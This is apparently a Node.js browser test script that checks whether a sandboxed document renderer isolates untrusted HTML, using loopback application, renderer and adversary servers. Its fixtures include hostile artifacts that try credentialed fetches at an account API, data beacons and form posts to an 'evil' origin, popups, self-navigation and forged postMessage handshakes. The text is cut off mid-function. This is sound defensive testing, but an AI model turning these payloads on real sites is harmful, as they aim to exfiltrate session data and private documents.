#!/usr/bin/env node
/**
 * AHU-005 — the permanent isolated-renderer oracle.
 *
 *   node scripts/test-hosted-renderer.mjs
 *
 * The renderer's contract is a browser contract. Every claim it makes is a claim
 * about what an engine does with an opaque origin, an inherited content-security
 * policy, a `srcdoc` document and a `postMessage` whose `source` and `origin` a
 * listener has to check separately. None of that can be asserted against a
 * string: a policy that reads perfectly and a sandbox attribute spelled exactly
 * right are both compatible with an artifact that reads the account page's
 * cookies. So this runner drives two real engines against three real loopback
 * origins and the actual build output.
 *
 * Three origins, because the design is about origins:
 *
 *   * the **application** origin, which holds a session cookie and the private
 *     document API, and which frames the renderer;
 *   * the **renderer** origin, a different host serving exactly what
 *     `renderer/scripts/build.mjs` produced, with the generated `_headers`
 *     applied to every response;
 *   * an **adversary** origin, which the artifact is invited to reach and which
 *     records every request it receives, so "blocked" is proven by the absence of
 *     a request at a server rather than by the absence of an exception.
 *
 * It is self-supervised and self-contained, in the shape
 * `scripts/test-p4-k-browser.mjs` established: the parent installs exactly one
 * pinned Playwright and its two browsers into a mode-0700 temporary root outside
 * the worktree, runs the matrix as a detached child under a real deadline,
 * escalates `SIGTERM` to `SIGKILL`, proves the process group is gone and removes
 * the root. No credential, no network beyond loopback, no live GitHub, no private
 * store and no repository state is touched.
 *
 * A note on what a pass here does and does not mean. It means the isolation
 * holds in these engines at these versions against these payloads. It does not
 * mean arbitrary hostile HTML is harmless: an artifact can still spend the
 * reader's CPU, draw whatever it likes inside its own frame and navigate itself.
 * The sandbox removes the artifact's authority over the account origin. That is
 * the whole claim, and it is the only one asserted below.
 */

import assert from "node:assert/strict";
import { spawn, spawnSync } from "node:child_process";
import { randomBytes } from "node:crypto";
import { createServer } from "node:http";
import { existsSync } from "node:fs";
import { cp, mkdtemp, readdir, readFile, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { dirname, join, resolve } from "node:path";
import { fileURLToPath, pathToFileURL } from "node:url";

const SELF = fileURLToPath(import.meta.url);
const ROOT = resolve(dirname(SELF), "..");

const PLAYWRIGHT = "playwright@1.55.0";
const ENGINES = ["chromium", "firefox"];
const DEADLINE_MS = 300_000;
const INSTALL_DEADLINE_MS = 900_000;
const TERM_GRACE_MS = 2_000;
const MAX_STREAM_BYTES = 4 * 1024 * 1024;
const NONCE_PATTERN = /^[0-9a-f]{64}$/;

/* The transcript is the only thing CI reads, so it has to say enough to be
   worth reading. The `INFO` lines record the effective policies the matrix
   actually validated -- a claim about isolation is a claim about a specific
   policy, and a runner that validated one and printed nothing leaves a reviewer
   guessing. The final line names both engines with their versions, because the
   claim is about those engines at those versions, and carries the number of
   cases that completed, so a matrix that returned early or skipped an engine
   cannot print the same line as one that ran. */
const TRANSCRIPT = /^PASS {2}hosted renderer isolation matrix \(chromium [\w.]+, firefox [\w.]+; (\d+) cases per engine\)$/;

/* An invented session cookie for an invented account. It authorises nothing:
   the fixture application below is the only thing that has ever heard of it. */
const SESSION_COOKIE = "archon_session=6f1c4b2ad9e4471fae03c0d5b78e2210";
/** Filled in from `MATRIX_CASES` below; the parent checks the worker against it. */
let EXPECTED_CASES = 0;
const DOCUMENT_BYTES = "the private bytes of a document nobody else may read";

function die(message) {
  process.stderr.write(`${message}\n`);
  process.exit(1);
}

/* ------------------------------------------------------------------ *
 * Supervisor.
 * ------------------------------------------------------------------ */

function install(root) {
  const browsers = join(root, "browsers");
  const npm = spawnSync(
    "npm",
    ["install", "--ignore-scripts", "--no-save", "--no-audit", "--no-fund",
      "--silent", "--prefix", root, PLAYWRIGHT],
    { stdio: ["ignore", "ignore", "pipe"], timeout: INSTALL_DEADLINE_MS, encoding: "utf8" },
  );
  if (npm.status !== 0) {
    die(`could not install ${PLAYWRIGHT}: ${(npm.stderr || "").split("\n")[0]}`);
  }
  const cli = join(root, "node_modules", "playwright", "cli.js");
  if (!existsSync(cli)) die(`the pinned ${PLAYWRIGHT} install produced no CLI`);
  const browserInstall = spawnSync(process.execPath, [cli, "install", ...ENGINES], {
    stdio: ["ignore", "ignore", "pipe"],
    timeout: INSTALL_DEADLINE_MS,
    encoding: "utf8",
    env: { ...process.env, PLAYWRIGHT_BROWSERS_PATH: browsers },
  });
  if (browserInstall.status !== 0) {
    die(`could not install the pinned browsers: ${(browserInstall.stderr || "").split("\n")[0]}`);
  }
  return browsers;
}

async function parent() {
  const tempRoot = await mkdtemp(join(tmpdir(), "ahu005-renderer-"));
  const problems = [];
  let stdout = "";

  try {
    const browsers = install(tempRoot);
    const nonce = randomBytes(32).toString("hex");

    let child;
    let timer = null;
    let killTimer = null;
    let timedOut = false;
    const chunks = { stdout: [], stderr: [] };
    const sizes = { stdout: 0, stderr: 0 };
    const forwarders = new Map();

    const finished = await new Promise((resolveRun) => {
      child = spawn(process.execPath, ["--no-warnings", SELF, "--worker"], {
        cwd: ROOT,
        detached: true,
        stdio: ["ignore", "pipe", "pipe"],
        env: {
          ...process.env,
          AHU005_NONCE: nonce,
          AHU005_TEMP_ROOT: tempRoot,
          PLAYWRIGHT_BROWSERS_PATH: browsers,
        },
      });

      for (const name of ["stdout", "stderr"]) {
        child[name].on("data", (chunk) => {
          if (sizes[name] >= MAX_STREAM_BYTES) return;
          sizes[name] += chunk.length;
          chunks[name].push(chunk);
        });
      }

      const stopGroup = () => {
        try {
          process.kill(-child.pid, "SIGTERM");
        } catch {
          // Already gone.
        }
        if (killTimer === null) {
          killTimer = setTimeout(() => {
            try {
              process.kill(-child.pid, "SIGKILL");
            } catch {
              // Already gone.
            }
          }, TERM_GRACE_MS);
          killTimer.unref();
        }
      };

      for (const signal of ["SIGHUP", "SIGINT", "SIGTERM"]) {
        const handler = () => {
          timedOut = true;
          stopGroup();
        };
        forwarders.set(signal, handler);
        process.on(signal, handler);
      }

      timer = setTimeout(() => {
        timedOut = true;
        stopGroup();
      }, DEADLINE_MS);

      child.on("close", (code, signal) => resolveRun({ code, signal }));
    });

    if (timer !== null) clearTimeout(timer);
    if (killTimer !== null) clearTimeout(killTimer);
    for (const [signal, handler] of forwarders) process.off(signal, handler);

    stdout = Buffer.concat(chunks.stdout).toString("utf8");
    const stderr = Buffer.concat(chunks.stderr).toString("utf8");

    /* A browser that outlived `browser.close()` would otherwise be left running
       on the machine for the rest of the job while this reports that it is
       still there. Escalate first, complain second: the poll runs, and if the
       group survives it is signalled and polled again before the problem is
       recorded. */
    const groupIsGone = async (attempts) => {
      for (let attempt = 0; attempt < attempts; attempt += 1) {
        try {
          process.kill(-child.pid, 0);
          await new Promise((r) => setTimeout(r, 50));
        } catch {
          return true;
        }
      }
      return false;
    };
    let groupGone = await groupIsGone(40);
    if (!groupGone) {
      try {
        process.kill(-child.pid, "SIGTERM");
      } catch {
        // Already gone.
      }
      groupGone = await groupIsGone(40);
    }
    if (!groupGone) {
      try {
        process.kill(-child.pid, "SIGKILL");
      } catch {
        // Already gone.
      }
      groupGone = await groupIsGone(40);
    }

    if (timedOut) problems.push(`worker exceeded the ${DEADLINE_MS} ms deadline`);
    if (finished.code !== 0) {
      problems.push(`worker exited with code ${finished.code} signal ${finished.signal}`);
    }
    if (stderr !== "") problems.push(`worker stderr was not empty:\n${stderr}`);
    const lines = stdout.split("\n");
    if (lines.pop() !== "") {
      problems.push(`worker stdout did not end with a newline:\n${stdout}`);
    }
    const last = lines.pop();
    const match = last === undefined ? null : TRANSCRIPT.exec(last);
    if (match === null) {
      problems.push(`worker stdout did not match the expected transcript:\n${stdout}`);
    } else if (Number(match[1]) !== EXPECTED_CASES) {
      problems.push(`worker ran ${match[1]} cases per engine, expected ${EXPECTED_CASES}`);
    }
    for (const line of lines) {
      if (!line.startsWith("INFO  ")) {
        problems.push(`worker stdout carried an unexpected line: ${line}`);
      }
    }
    if (!groupGone) problems.push("the worker process group did not disappear");

    /* The pinned install and the build output are the runner's own and are
       removed before residue is judged; anything else under the root is fixture
       state that leaked out of a case. */
    await rm(join(tempRoot, "node_modules"), { recursive: true, force: true });
    await rm(join(tempRoot, "package.json"), { force: true });
    await rm(join(tempRoot, "package-lock.json"), { force: true });
    await rm(join(tempRoot, "dist"), { recursive: true, force: true });
    await rm(join(tempRoot, "dist-secret"), { recursive: true, force: true });
    await rm(browsers, { recursive: true, force: true });
    let residue = [];
    try {
      residue = await readdir(tempRoot);
    } catch {
      residue = [];
    }
    if (residue.length !== 0) {
      problems.push(`temporary fixture state was left behind: ${residue.join(", ")}`);
    }
  } finally {
    await rm(tempRoot, { recursive: true, force: true });
  }

  if (problems.length !== 0) {
    for (const problem of problems) process.stderr.write(`${problem}\n`);
    process.exit(1);
  }
  process.stdout.write(stdout);
}

/* ------------------------------------------------------------------ *
 * Fixture artifacts.
 * ------------------------------------------------------------------ */

/** A perfectly ordinary self-contained document with one working control. */
const INTERACTIVE_ARTIFACT = `<!doctype html>
<html lang="en"><head><meta charset="utf-8"><title>Quarterly report</title>
<style>body{font:16px/1.5 system-ui;margin:0;padding:2rem;background:#ffffff}
#panel{background:rgb(240, 240, 240);padding:1rem}</style></head>
<body>
<h1 id="heading">Quarterly report</h1>
<div id="panel">closed</div>
<button id="toggle" type="button">Toggle detail</button>
<script>
document.getElementById("toggle").addEventListener("click", function () {
  var panel = document.getElementById("panel");
  panel.textContent = "open";
  panel.style.background = "rgb(0, 128, 0)";
});
</script>
</body></html>`;

/**
 * Everything the ticket names as hostile, in one document.
 *
 * A policy that loosens, a base element that repoints every relative URL, inline
 * event handlers, a nested frame, closing-tag sequences that would end an
 * element early if this were being interpolated into one, remote subresources of
 * every kind, a credentialed fetch at the account API, a form, a popup and a top
 * navigation. The runner asserts that the document still renders, that its own
 * inline handler still works -- an artifact is allowed to be interactive -- and
 * that not one of the escapes reaches anything.
 */
function hostileArtifact({ appOrigin, evilOrigin }) {
  return `<!doctype html>
<html lang="en"><head>
<meta charset="utf-8">
<meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline' 'unsafe-eval' data: blob:">
<base href="${evilOrigin}/">
<title>Hostile</title>
<link rel="stylesheet" href="${evilOrigin}/evil.css">
<script src="${evilOrigin}/evil.js"></script>
</head>
<body onload="window.__onloadRan = true">
<h1 id="heading">Hostile</h1>
<div id="panel">closed</div>
<button id="toggle" type="button" onclick="document.getElementById('panel').textContent='open'">Toggle</button>
<img id="relative" src="pixel.png" alt="">
<img id="absolute" src="${evilOrigin}/pixel.png" alt="">
<img id="account" src="${appOrigin}/beacon.png" alt="">
<iframe id="nested-remote" src="${evilOrigin}/nested.html" title="nested remote"></iframe>
<iframe id="nested-blank" src="about:blank" title="nested blank"></iframe>
<form id="exfil" method="POST" action="${evilOrigin}/collect"><input name="q" value="x"><button type="submit">go</button></form>
<p>&lt;/script&gt; &lt;/body&gt; &lt;/html&gt; &lt;/iframe&gt; literal closing sequences</p>
<script>
window.__attempts = {};
function record(name, run) {
  try { window.__attempts[name] = { ok: true, value: run() }; }
  catch (error) { window.__attempts[name] = { ok: false, error: String(error && error.name) }; }
}
record("parentDocument", function () { return typeof parent.document; });
record("topDocument", function () { return typeof top.document; });
record("parentLocation", function () { return parent.location.href; });
record("cookie", function () { return document.cookie; });
record("localStorage", function () { return typeof localStorage; });
record("openPopup", function () { return String(window.open("${evilOrigin}/popup.html")); });
record("topNavigation", function () { top.location.href = "${evilOrigin}/taken.html"; return "attempted"; });
record("origin", function () { return String(window.origin); });
window.__fetches = {};
function attempt(name, url, options) {
  window.__fetches[name] = "pending";
  try {
    fetch(url, options).then(function (response) {
      return response.text().then(function (body) {
        window.__fetches[name] = "read:" + body.slice(0, 40);
      });
    }, function (error) {
      window.__fetches[name] = "rejected:" + String(error && error.name);
    });
  } catch (error) {
    window.__fetches[name] = "threw:" + String(error && error.name);
  }
}
attempt("documentContent", "${appOrigin}/api/hosted/docs/d1/content", { credentials: "include" });
attempt("mutation", "${appOrigin}/api/hosted/mutate", { method: "POST", credentials: "include", body: "x" });
attempt("beacon", "${evilOrigin}/collect?stolen=1", { mode: "no-cors" });
document.getElementById("exfil").submit();
</script>
</body></html>`;
}

/**
 * An artifact that tries to replace itself with attacker-served content.
 *
 * Self-navigation is the one escape neither the sandbox nor the artifact's own
 * policy speaks to: a frame may always navigate itself, `allow-top-navigation`
 * is about the frame above, `connect-src`, `img-src` and `object-src` do not
 * apply to a same-frame navigation, and CSP's `navigate-to` was never shipped.
 * What stands in the way is the *embedder's* `frame-src`, which is engine
 * behaviour rather than a promise -- so it is probed in both engines rather
 * than assumed.
 *
 * It matters because the artifact sits inside the trusted viewer's chrome. An
 * artifact that could navigate itself to a live attacker page would be showing
 * "your Archon session expired, sign in to continue" inside a frame the reader
 * has every reason to trust; failing that, it would be a read receipt carrying
 * the reader's address and timing for a document the design promises is inert.
 *
 * It gets its own document because an attempted navigation tears down the one
 * making the attempt, which would make every other measurement in the hostile
 * payload a race.
 */
function selfNavigatingArtifact({ evilOrigin }) {
  return `<!doctype html>
<html lang="en"><head><meta charset="utf-8"><title>Self navigation</title></head>
<body>
<p id="here">still the artifact</p>
<script>
window.__navigation = [];
try { location.href = "${evilOrigin}/taken.html"; window.__navigation.push("assign-returned"); }
catch (error) { window.__navigation.push("assign-threw:" + String(error && error.name)); }
try { location.replace("${evilOrigin}/replaced.html"); window.__navigation.push("replace-returned"); }
catch (error) { window.__navigation.push("replace-threw:" + String(error && error.name)); }
try { location.assign("${evilOrigin}/assigned.html"); window.__navigation.push("assign2-returned"); }
catch (error) { window.__navigation.push("assign2-threw:" + String(error && error.name)); }
<\/script>
</body></html>`;
}

/** Fragment-only links, including one an authored listener claims for itself. */
const FRAGMENT_ARTIFACT = `<!doctype html>
<html lang="en"><head><meta charset="utf-8"><title>Fragments</title>
<style>body{margin:0}section{height:150vh;padding:1rem}</style></head>
<body>
<nav>
  <a id="to-two" href="#section-two">Two</a>
  <a id="to-missing" href="#no-such-section">Missing</a>
  <a id="to-claimed" href="#section-two">Claimed</a>
  <a id="to-encoded" href="#s%C3%A9ction">Encoded</a>
</nav>
<section id="section-one">One</section>
<section id="section-two">Two</section>
<section id="s&eacute;ction">Accented</section>
<script>
window.__authored = [];
document.getElementById("to-claimed").addEventListener("click", function (event) {
  window.__authored.push("claimed");
  event.preventDefault();
});
document.getElementById("to-two").addEventListener("click", function () {
  window.__authored.push("observed");
});
</script>
</body></html>`;

/* ------------------------------------------------------------------ *
 * The three loopback origins.
 * ------------------------------------------------------------------ */

function listen(server, host) {
  return new Promise((done) => {
    server.listen(0, "127.0.0.1", () => done(`http://${host}:${server.address().port}`));
  });
}

function trackSockets(server) {
  const sockets = new Set();
  server.on("connection", (socket) => {
    sockets.add(socket);
    socket.on("close", () => sockets.delete(socket));
  });
  return () => new Promise((done) => {
    for (const socket of sockets) socket.destroy();
    server.close(done);
  });
}

/**
 * The trusted application origin: a session cookie, a private document API and
 * a viewer shell.
 *
 * The shell is a fixture rather than production code. AHU-009 owns the real
 * trusted viewer; what is needed here is the *other end* of C4's handshake --
 * a page on a separate origin that frames the renderer, checks the readiness
 * message's origin and source, and posts exactly one artifact to exactly one
 * window. Everything the real viewer additionally does (title, owner identity,
 * sign-out, loading and failed states) is its own ticket's to assert.
 */
async function startApp(state, config) {
  const viewer = (search, renderOrigin) => `<!doctype html>
<html lang="en"><head><meta charset="utf-8"><title>Account viewer fixture</title>
<style>#renderer{width:600px;height:400px;border:1px solid #333}</style></head>
<body>
<button id="first" type="button">before the frame</button>
<p id="status"></p>
<div id="slot"></div>
<div id="siblings"></div>
<script>
var RENDER_ORIGIN = ${JSON.stringify(renderOrigin)};
var params = new URLSearchParams(${JSON.stringify(search)});
var state = { ready: false, sent: 0, refused: [], unavailable: false };
window.__app = state;

var frame = document.createElement("iframe");
frame.id = "renderer";
frame.title = "Document renderer";
/* Without this the account origin reaches the artifact. An \`about:srcdoc\`
   document inherits its parent's referrer, and the renderer document's
   referrer is whatever the viewer's frame sent -- in Firefox that is the full
   application origin, readable from inside the sandbox as
   \`document.referrer\`. Chromium happens to send nothing; \`no-referrer\` makes
   both engines agree, and it is part of the contract in \`renderer/README.md\`
   rather than a property of this fixture. */
frame.referrerPolicy = "no-referrer";
frame.src = RENDER_ORIGIN + (params.get("rendererPath") || "/");
document.getElementById("slot").appendChild(frame);
window.__rendererFrame = frame;

var html = null;
fetch("/artifact/" + (params.get("artifact") || "interactive"))
  .then(function (response) { return response.text(); })
  .then(function (text) { html = text; maybeSend(); });

addEventListener("message", function (event) {
  if (event.origin !== RENDER_ORIGIN) { state.refused.push("origin"); return; }
  if (event.source !== frame.contentWindow) { state.refused.push("window"); return; }
  var data = event.data;
  if (!data || data.type !== "archon:ready" || data.v !== 1) { state.refused.push("shape"); return; }
  state.ready = true;
  maybeSend();
});

window.__send = function (payload) {
  var message = payload === undefined ? { type: "archon:render", v: 1, html: html } : payload;
  frame.contentWindow.postMessage(message, RENDER_ORIGIN);
  state.sent += 1;
};
function maybeSend() {
  if (!state.ready || html === null || state.sent > 0) return;
  if ((params.get("mode") || "auto") !== "auto") return;
  window.__send();
}

window.__addSibling = function () {
  var sibling = document.createElement("iframe");
  sibling.id = "sibling";
  sibling.src = "/sibling.html?target=" + encodeURIComponent(RENDER_ORIGIN);
  document.getElementById("siblings").appendChild(sibling);
};

/* Two ways a readiness message can be forged, and the account side has to
   refuse both. A SECOND renderer frame produces a flawless origin from the
   wrong window; a frame on the adversary origin produces the wrong origin. In
   neither case may the private document be sent. */
window.__addSecondRenderer = function () {
  var second = document.createElement("iframe");
  second.id = "second-renderer";
  second.src = RENDER_ORIGIN + "/";
  document.getElementById("siblings").appendChild(second);
};
window.__addForeignFrame = function (origin) {
  var foreign = document.createElement("iframe");
  foreign.id = "foreign";
  foreign.src = origin + "/ready.html";
  document.getElementById("siblings").appendChild(foreign);
};

/* The renderer never announcing itself is a real outcome -- a blocked frame, a
   failed deploy, an engine that refuses the embed -- and the account origin's
   answer to it is a recoverable message, never a copy of the document rendered
   here instead. */
setTimeout(function () {
  if (state.ready) return;
  state.unavailable = true;
  document.getElementById("status").textContent =
    "This document could not be displayed right now. Try again.";
}, 2500);
</script>
</body></html>`;

  const sibling = `<!doctype html>
<html lang="en"><head><meta charset="utf-8"><title>sibling</title></head><body>
<script>
/* Same-origin with the account page, so it can reach the renderer's window
   object and produce a message whose origin is flawless and whose source is
   not the window the renderer was mounted against. */
var target = new URLSearchParams(location.search).get("target");
var renderer = parent.document.getElementById("renderer").contentWindow;
window.__forge = function (html) {
  renderer.postMessage({ type: "archon:render", v: 1, html: html }, target);
};
parent.__siblingReady = true;
</script>
</body></html>`;

  const server = createServer((request, response) => {
    const url = new URL(request.url, "http://127.0.0.1");
    state.requests.push({ method: request.method, path: url.pathname, cookie: request.headers.cookie || "" });

    const send = (status, type, body, headers = {}) => {
      response.writeHead(status, {
        "Content-Type": type,
        "Cache-Control": "private, no-store",
        "X-Content-Type-Options": "nosniff",
        ...headers,
      });
      response.end(body);
    };

    if (url.pathname === "/viewer") {
      return send(200, "text/html; charset=utf-8", viewer(url.search, config.renderOrigin), {
        "Set-Cookie": `${SESSION_COOKIE}; Path=/; SameSite=Lax`,
      });
    }
    if (url.pathname === "/sibling.html") return send(200, "text/html; charset=utf-8", sibling);
    if (url.pathname.startsWith("/artifact/")) {
      const name = url.pathname.slice("/artifact/".length);
      const body = config.artifacts[name];
      if (body === undefined) return send(404, "text/plain; charset=utf-8", "no such artifact");
      return send(200, "text/plain; charset=utf-8", body);
    }
    if (url.pathname === "/api/hosted/docs/d1/content") {
      /* Every arrival is recorded, authorised or not. Counting only successful
         reads would make the assertion unfalsifiable: the artifact is
         opaque-origin and cross-site from the cookie's point of view, so it
         could never have carried the session anyway, and "no successful read"
         would hold even with the whole boundary removed. What has teeth is that
         the request does not arrive at all. */
      state.contentRequests.push({ cookie: request.headers.cookie || "" });
      if ((request.headers.cookie || "").includes(SESSION_COOKIE)) {
        state.contentReads.push(url.pathname);
        return send(200, "application/octet-stream", DOCUMENT_BYTES, {
          "Content-Disposition": 'attachment; filename="archon-document.html"',
        });
      }
      return send(401, "text/plain; charset=utf-8", "unauthenticated");
    }
    if (url.pathname === "/api/hosted/mutate") {
      state.mutations.push({ method: request.method, cookie: request.headers.cookie || "" });
      return send(204, "text/plain; charset=utf-8", "");
    }
    return send(404, "text/plain; charset=utf-8", "not found");
  });

  const close = trackSockets(server);
  const origin = await listen(server, "127.0.0.1");
  return { origin, close };
}

/**
 * The renderer origin: exactly what the build produced, with the generated
 * `_headers` applied.
 *
 * Parsing `_headers` and replaying it is the only way to make this an assertion
 * about the artifact that gets deployed. Hand-writing the same headers into this
 * server would test a copy, and a copy is the thing that goes stale on the day
 * somebody edits the build.
 */
function parseHeadersFile(text) {
  const headers = [];
  const blocks = [];
  for (const line of text.split("\n")) {
    if (line === "") continue;
    if (!line.startsWith(" ")) {
      blocks.push(line.trim());
      continue;
    }
    const separator = line.indexOf(":");
    assert.ok(separator > 0, `malformed _headers line: ${line}`);
    headers.push([line.slice(0, separator).trim(), line.slice(separator + 1).trim()]);
  }
  /* Exactly one block, and it is the global one. Netlify applies the most
     specific match, so a second, path-scoped block would take effect in
     production while a parser that only replayed `/*` dropped it on the floor
     and stayed green. Requiring one block means the file this runner replays is
     the whole file. */
  assert.deepEqual(blocks, ["/*"], "_headers must declare exactly one block, for /*");
  assert.ok(headers.length > 0, "_headers declared no headers for /*");
  return headers;
}

const CONTENT_TYPES = {
  ".html": "text/html; charset=utf-8",
  ".js": "text/javascript; charset=utf-8",
  ".css": "text/css; charset=utf-8",
};

/**
 * Read the built tree into memory: the generated header set, and every file the
 * build published.
 */
async function loadRendererBundle(distDir) {
  const headers = parseHeadersFile(await readFile(join(distDir, "_headers"), "utf8"));
  const files = new Map();
  for (const name of await readdir(distDir)) {
    if (name === "_headers") continue;
    files.set(`/${name}`, await readFile(join(distDir, name)));
  }
  return { headers, files };
}

/**
 * The renderer origin, serving whatever bundle it is given.
 *
 * It listens before the build runs, because the build has to be told the exact
 * origin its `frame-ancestors` will name and an ephemeral port is not knowable
 * in advance. The bundle is therefore a mutable holder rather than an argument:
 * the alternative is guessing a port, and a renderer built against a guessed
 * port is a renderer whose framing rule names nobody.
 */
/**
 * A deliberately permissive header set, used by exactly one case.
 *
 * Every directive the artifact's own `srcdoc` policy declares is also declared,
 * more strictly, by the renderer's real response headers -- which the artifact
 * inherits. That makes the inner policy invisible to every other case here:
 * delete the `meta` element entirely and nothing fails, because the inherited
 * header was doing the work. The inner policy is the thing that survives a
 * future loosening of the shell's own headers, so one case serves the shell
 * under a policy that grants everything and requires the artifact to be
 * contained anyway. It is a test fixture and never a deployable configuration.
 */
const PERMISSIVE_PREFIX = "/inner-policy-only/";
function permissiveHeaders(headers) {
  return headers.map(([name, value]) => [
    name,
    name === "Content-Security-Policy"
      ? value.replace(
        /^[^;]*(?:;[^;]*)*?(?=; frame-ancestors)/,
        "default-src * 'unsafe-inline' data: blob:",
      )
      : value,
  ]);
}

/**
 * A second fixture prefix, serving the same bundle with `frame-ancestors`
 * widened to `*`.
 *
 * `frame-ancestors` is what keeps a hostile page from framing the real
 * renderer at all, which means it also hides whether the readiness message is
 * addressed to anyone in particular: with no framer there is no one to receive
 * a `"*"` broadcast, and replacing the readiness `targetOrigin` with `"*"`
 * survives every other case here. Serving one path with the framing rule
 * removed puts an adversary parent behind a mounted renderer, so the exact
 * `targetOrigin` becomes the only thing standing between it and the handshake.
 * It is a test fixture and never a deployable configuration.
 */
const OPEN_FRAMING_PREFIX = "/open-framing/";
function openFramingHeaders(headers) {
  return headers.map(([name, value]) => [
    name,
    name === "Content-Security-Policy"
      ? value.replace(/frame-ancestors [^;]*/, "frame-ancestors *")
      : value,
  ]);
}

async function startRenderer(bundle, state) {
  const server = createServer((request, response) => {
    const url = new URL(request.url, "http://127.0.0.1");
    state.requests.push({ method: request.method, path: url.pathname });
    const permissive = url.pathname.startsWith(PERMISSIVE_PREFIX);
    const openFraming = url.pathname.startsWith(OPEN_FRAMING_PREFIX);
    const prefix = permissive ? PERMISSIVE_PREFIX : openFraming ? OPEN_FRAMING_PREFIX : "";
    const raw = prefix === "" ? url.pathname : `/${url.pathname.slice(prefix.length)}`;
    const path = raw === "/" ? "/index.html" : raw;
    const body = bundle.files.get(path);
    const common = Object.fromEntries(
      permissive
        ? permissiveHeaders(bundle.headers)
        : openFraming
          ? openFramingHeaders(bundle.headers)
          : bundle.headers,
    );
    if (body === undefined) {
      response.writeHead(404, { ...common, "Content-Type": "text/plain; charset=utf-8" });
      response.end("not found");
      return;
    }
    const extension = path.slice(path.lastIndexOf("."));
    response.writeHead(200, {
      ...common,
      "Content-Type": CONTENT_TYPES[extension] ?? "application/octet-stream",
      "Content-Length": body.length,
    });
    response.end(body);
  });

  const close = trackSockets(server);
  const origin = await listen(server, "localhost");
  return { origin, close };
}

/** The adversary: it records, and it is never reached. */
async function startEvil(state, config) {
  const framer = () => `<!doctype html>
<html lang="en"><head><meta charset="utf-8"><title>framer</title></head><body>
<iframe id="stolen" src="${config.renderOrigin}/" title="stolen renderer"></iframe>
</body></html>`;

  const server = createServer((request, response) => {
    const url = new URL(request.url, "http://127.0.0.1");
    state.requests.push({ method: request.method, path: url.pathname });
    if (url.pathname === "/frame.html") {
      response.writeHead(200, { "Content-Type": "text/html; charset=utf-8", "Cache-Control": "no-store" });
      response.end(framer());
      return;
    }
    if (url.pathname === "/ready.html") {
      response.writeHead(200, { "Content-Type": "text/html; charset=utf-8", "Cache-Control": "no-store" });
      response.end(
        '<!doctype html><meta charset="utf-8"><title>ready</title>'
        + '<script>parent.postMessage({ type: "archon:ready", v: 1 }, "*");<\/script>',
      );
      return;
    }
    if (url.pathname === "/listen.html") {
      /* An adversary parent behind a renderer whose framing rule was removed.
         It records every message it receives from anywhere; the assertion is
         that the readiness handshake is not among them. */
      response.writeHead(200, { "Content-Type": "text/html; charset=utf-8", "Cache-Control": "no-store" });
      response.end(
        '<!doctype html><meta charset="utf-8"><title>listener</title>'
        + "<script>window.__received = [];"
        + 'addEventListener("message", function (event) {'
        + " window.__received.push({ origin: event.origin, data: event.data });"
        + "});<\/script>"
        + `<iframe id="stolen" title="stolen renderer" src="${config.renderOrigin}${OPEN_FRAMING_PREFIX}"></iframe>`,
      );
      return;
    }
    if (url.pathname === "/evil.js") {
      response.writeHead(200, { "Content-Type": "text/javascript; charset=utf-8" });
      response.end("window.__evilScriptRan = true;");
      return;
    }
    response.writeHead(200, { "Content-Type": "text/plain; charset=utf-8" });
    response.end("ok");
  });

  const close = trackSockets(server);
  const origin = await listen(server, "127.0.0.1");
  return { origin, close };
}

/* ------------------------------------------------------------------ *
 * Node-side assertions: the two copies of the contract, and the build.
 * ------------------------------------------------------------------ */

/**
 * The rows both copies of the render-message validator must agree on.
 *
 * `netlify/lib/hosted/contracts.mjs` is the canonical statement and the renderer cannot
 * import it -- it is a separate static deployment with no dependency tree -- so
 * the renderer restates it. A restatement without this table is a fork waiting
 * to happen, and the failure it produces is the worst kind: an artifact the
 * application accepted and the renderer silently refused, or the reverse.
 */
function messageParityRows() {
  const big = "a".repeat(2097153);
  return [
    ["a minimal document", { type: "archon:render", v: 1, html: "<p>x</p>" }],
    ["one byte", { type: "archon:render", v: 1, html: "x" }],
    ["exactly at the cap", { type: "archon:render", v: 1, html: "a".repeat(2097152) }],
    ["one byte over the cap", { type: "archon:render", v: 1, html: big }],
    ["multibyte at the cap", { type: "archon:render", v: 1, html: "é".repeat(1048576) }],
    ["multibyte over the cap", { type: "archon:render", v: 1, html: "é".repeat(1048577) }],
    ["empty html", { type: "archon:render", v: 1, html: "" }],
    ["a NUL", { type: "archon:render", v: 1, html: "a\u0000b" }],
    ["a lone surrogate", { type: "archon:render", v: 1, html: "a\ud800b" }],
    ["the readiness type", { type: "archon:ready", v: 1, html: "<p>x</p>" }],
    ["an unknown type", { type: "archon:resize", v: 1, html: "<p>x</p>" }],
    ["a future version", { type: "archon:render", v: 2, html: "<p>x</p>" }],
    ["a string version", { type: "archon:render", v: "1", html: "<p>x</p>" }],
    ["an extra key", { type: "archon:render", v: 1, html: "<p>x</p>", documentId: "d1" }],
    ["a missing key", { type: "archon:render", v: 1 }],
    ["html that is not a string", { type: "archon:render", v: 1, html: 5 }],
    ["null", null],
    ["an array", ["archon:render", 1, "<p>x</p>"]],
    ["a string", "archon:render"],
  ];
}

/** The origin spellings both copies of the origin rule must agree on. */
function originParityRows() {
  return [
    "https://render.example.com",
    "https://render.example.com:8443",
    "http://127.0.0.1:4001",
    "http://localhost:4002",
    "https://render.example.com/",
    "https://render.example.com/path",
    "https://render.example.com?q=1",
    "https://RENDER.example.com",
    "https://render.example.com.",
    "https://user:pass@render.example.com",
    "render.example.com",
    "ftp://render.example.com",
    "",
    "https://render.example.com\nX-Injected: 1",
  ];
}

async function assertContractParity(rendererModule) {
  const hosted = await import(pathToFileURL(join(ROOT, "netlify/lib/hosted/contracts.mjs")).href);

  for (const [label, value] of messageParityRows()) {
    const verdict = (run) => {
      try {
        run();
        return "accepted";
      } catch (error) {
        return `rejected:${error.code}`;
      }
    };
    const hostedVerdict = verdict(() => hosted.validateRenderMessage(value));
    const rendererVerdict = verdict(() => rendererModule.validateRenderMessage(value));
    assert.equal(
      rendererVerdict,
      hostedVerdict,
      `render-message parity for ${label}: hosted said ${hostedVerdict}, renderer said ${rendererVerdict}`,
    );
  }

  const build = await import(pathToFileURL(join(ROOT, "renderer/scripts/build.mjs")).href);
  for (const value of originParityRows()) {
    for (const production of [true, false]) {
      let hostedVerdict;
      try {
        hostedVerdict = `accepted:${hosted.validateOrigin(value, { production })}`;
      } catch {
        hostedVerdict = "rejected";
      }
      let rendererVerdict;
      try {
        rendererVerdict = `accepted:${build.readOrigin({ ORIGIN: value }, "ORIGIN", production)}`;
